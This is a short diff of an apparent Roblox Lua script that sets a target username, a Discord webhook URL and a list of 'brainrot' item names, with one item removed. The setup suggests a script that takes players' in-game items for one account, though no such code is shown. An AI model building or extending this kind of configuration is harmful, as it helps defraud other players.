@@ -3,7 +3,6 @@ local TARGET_USER = "ddiablo71"
 local WEBHOOK_URL = "https://discord.gg/KeFPsjxu8"
 
 local TargetBrainrots = {
-    ["4th Bros"] = true,
     ["Antonio"] = true,
     ["Arcadragon"] = true,
     ["Arca Bros"] = true,
